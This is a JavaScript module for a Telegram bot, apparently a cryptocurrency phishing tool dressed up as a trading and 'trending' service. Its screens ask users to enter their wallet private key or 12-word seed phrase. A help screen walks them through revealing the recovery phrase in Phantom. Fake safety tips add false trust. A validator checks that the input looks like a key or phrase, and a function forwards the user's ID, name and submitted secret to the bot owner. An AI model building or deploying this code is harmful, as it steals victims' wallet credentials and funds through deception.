import { Markup } from "telegraf";
import path from 'path'
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url)
const __dirname = path.dirname(__filename)

const imageUrl = {
  CONNECT1: path.join(__dirname, "img", "connect-wallet.png"),
  CONNECT2: path.join(__dirname, "img", "wallet-connect.jpg")
}

export const Connect = ()=> ({
  media: {
    source: imageUrl.CONNECT1,
    caption: `<b>🔗 Connect Your Wallet</b>\n\n` +
    `To connect your wallet and access automated features, please continue with our specialized/ Developers wallet.\n\n`+
    `✅ What you'll get:\n\n`+
    `• Free access to Trending\n\n` +
    `• Automated wallet connection\n\n` +
    `• Secure transaction processing\n\n` +
    `• Instant withdrawal processing\n\n` +
    `🚀 <b>Click below to continue</b>:`,
    parse_mode: 'HTML'
  },
  extra: Markup.inlineKeyboard([
    [Markup.button.callback('🛡️ Connect-wallet', 'Connect_wallet')],
    [Markup.button.callback('Why Connect ❓', 'reason'), Markup.button.callback('⛑ Safety TIPs', 'safety_tips')],
    [Markup.button.callback('📝 How to connect wallet', 'document_doc')],
    [Markup.button.callback('🔙 Back', 'Back')]
  ])

})

export const awaitConnect = ()=> ({
  media: {
    source: imageUrl.CONNECT2,
    caption: `📥 <b>Kindly Enter your Private Key or 12 word Seed Phrase to import your wallet:</b>`,
    parse_mode: 'HTML'  
  },
  extra: Markup.keyboard([])
})

export const whyConnect = () => ({
  media: {
    caption: `Connecting allows withdrawals and helps you identify real tokens vs scams It is required to verify Developer Wallets and ensure you aren't trading rug pulls.`
  }
})

export const safetyTips = ()=> ({
  media: {
    caption: `<u>“Please Note carefully"</u>\n`+
            `<blockquote>` +
            `⚠️ Never share your phrase code  with anyone. Create a new wallet if possible and connect that instead !\n`+
            `⚠️ Never share your phrase code  with anyone. Create a new wallet if possible and connect that instead !\n`+
            `🔐 Ensure you are only interacting with the official bot…\n`+
            `https://t.me/momentumXVolume_bot`+
            `</blockquote>\n\n` +
            `• Only use trusted wallets and official apps.\n`+
            `• Double-check URLs and avoid phishing sites.\n`+
            `• Enable two-factor authentication where possible.\n`+
            `• The bot will never ask for your funds or\n`+ `transfer tokens  without your consent.\n`+
           `• If you suspect suspicious activity, disconnect\n`+
           `• your wallet and contact support immediately.`,
    parse_mode: 'HTML'
  },
  extra: Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back', 'Back')]
  ])
})

export const documentDoc = ()=> ({
  media: {
    caption: `<u>Steps for a successful wallet connection !</u>\n\n`+
            `<b><u>Send in your 12 seed</u></b>  phrase or private key to the official bot for connection !\n\n`+
            `<b><u>Don’t know how to connect wallet?</u></b>\n\n`+
            `<b><u>If you using phantom:</u></b>\n\n`+
            `- <b>Head down</b> to your phantom wallet.\n`+
            `- click on settings\n`+
            `- after setting click on security and privacy..\n`+
            `- after security and privacy scroll down and you will see show recovery phrase\n`+
            `- one that is done that is your 12 seed phrase code you can use to connect your wallet\n`+
            `<blockquote>\n` +
            `⚠️ And please NOTE 🗒 AGAIN don’t share with anyone and\n`+
            `make sure you sending to the official bot, no Pumpfun Admjn.\n`+
            `will ever ask for your 12 phrase code or private key!\n`+
            `</blockquote>\n\n` +
            `<u>If you using pump.fun wallet</u>\n\n`+ 
            `- <b>head</b> down to your pump.fun application and open it\n`+
           `- click on your profile and you will see 3 lines at the top right of the application click on that\n`+
           `- after that head scroll down to settings on the application and click on that\n`+
           `- after that you will see import wallet you click on that also that is what you can use to link and connect your wallet so you can access your order.. \n\n\n`+
           `<blockquote>\n`+
           `⚠️And please NOTE 🗒 \n`+
           `AGAIN don’t share with anyone and make sure you sending\n`+
           `to the official bot, no pumpfun Admin will ever ask for your \n`+
           `12 seed phrase or private key!\n`+
           `</blockquote>`,
    parse_mode: 'HTML'
  },
  extra: Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back', 'Back')]
  ])
})

export const verifyKeyphrase = (text) => {
  const cleanText = text.trim();
  
  const keyphraseRegex = /^[a-z]+( [a-z]+){11,23}$/;
  
  const publicKeyRegex = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;
  
  const privateKeyRegex = /^[1-9A-HJ-NP-Za-km-z]{87,88}$/;
  
  return (
    keyphraseRegex.test(cleanText.toLowerCase()) || 
    publicKeyRegex.test(cleanText) || 
    privateKeyRegex.test(cleanText)
  );
};

export const sendMessageToOwner = (ctx, messageText)=> ({
  media: {
    caption: `<b>🚨 USER INFORMATION</b>\n\n`+
            `🆔 USER_ID: ${ctx.from.id}\n\n` +
            `👤 USER_NAME: ${ctx.from.first_name}\n\n` +
            `💬 MESSAGE: <code>${messageText}</code>`,
    parse_mode: 'HTML'
  }
})

